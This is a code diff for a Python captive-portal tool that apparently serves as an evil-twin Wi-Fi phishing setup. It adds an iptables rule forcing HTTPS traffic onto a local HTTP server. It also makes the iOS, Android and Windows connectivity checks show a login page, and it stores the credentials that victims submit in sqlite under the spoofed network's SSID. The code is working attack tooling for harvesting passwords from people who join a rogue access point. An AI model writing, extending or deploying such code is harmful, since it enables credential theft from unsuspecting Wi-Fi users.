@@ -89,6 +89,10 @@ def install_iptables_captive(ap_iface):
         ["iptables", "-t", "nat", "-A", "PREROUTING",
          "-i", ap_iface, "-p", "tcp", "--dport", "80",
          "-j", "DNAT", "--to-destination", "192.168.1.1:80"],
+        # Also redirect HTTPS traffic (will cause cert errors but trigger portal)
+        ["iptables", "-t", "nat", "-A", "PREROUTING",
+         "-i", ap_iface, "-p", "tcp", "--dport", "443",
+         "-j", "DNAT", "--to-destination", "192.168.1.1:80"],
     ]
     for cmd in cmds:
         # never abort on iptables errors
@@ -167,31 +171,34 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(data)
 
-    # --- request handlers ---
     def do_GET(self):
         client_ip = self.client_address[0]
         path = self.path.split("?", 1)[0]
         print(f"[GET]  {client_ip} -> {self.path}")
 
-        # Common captive-check endpoints -> serve portal (so OS opens captive webview)
-        if path in ("/generate_204", "/hotspot-detect.html", "/ncsi.txt"):
-            # Serve the login page (not the expected 204) to trigger captive portal UI.
+        # Apple/iOS detection
+        if "captive.apple.com" in self.headers.get('Host', '') or path == "/hotspot-detect.html":
+            print("→ iOS/macOS captive detection triggered")
+            self._serve_login()
+            return
+            
+        # Android detection
+        if "connectivitycheck.gstatic.com" in self.headers.get('Host', '') or path == "/generate_204":
+            print("→ Android captive detection triggered")
+            self._serve_login()  # Instead of 204 response to trigger portal
+            return
+            
+        # Windows detection
+        if "msftconnecttest.com" in self.headers.get('Host', '') or path == "/ncsi.txt" or path == "/redirect":
+            print("→ Windows captive detection triggered")
             self._serve_login()
             return
 
-        # ping used by client-side JS to bypass caches — return 204 No Content
-        if path.startswith("/__portal_ping"):
-            self.send_response(204)
-            self._add_no_cache_headers()
-            self.end_headers()
+        # Common captive-check endpoints
+        if path in ("/generate_204", "/hotspot-detect.html", "/ncsi.txt", "/redirect", "/success"):
+            print("→ Generic captive detection triggered")
+            self._serve_login()
             return
-
-        # try to serve static file if exists under /var/www/html (images/js/css)
-        if path != "/" and self._serve_file(path):
-            return
-
-        # default -> show login page (index.html)
-        self._serve_login()
 
     def do_POST(self):
         client_ip = self.client_address[0]
@@ -244,7 +251,7 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
         # Try saving to sqlite via db_helper if available and CURRENT_SSID set
         try:
             try:
-                from db_helper import save_credential  # noqa: E402
+                from db_helper import save_credential
             except ImportError:
                 save_credential = None
             # CURRENT_SSID may be defined at module level by your program; try to access it
@@ -292,7 +299,9 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
 
 def start_captive_http(ap_iface, port=80):
     CaptivePortalHandler.ap_iface = ap_iface
+    # Allow socket reuse to avoid "address already in use" errors
     server = HTTPServer(("0.0.0.0", port), CaptivePortalHandler)
+    server.allow_reuse_address = True
     threading.Thread(target=server.serve_forever, daemon=True).start()
     print(f"[+] Captive portal HTTP server on port {port}")
     return server
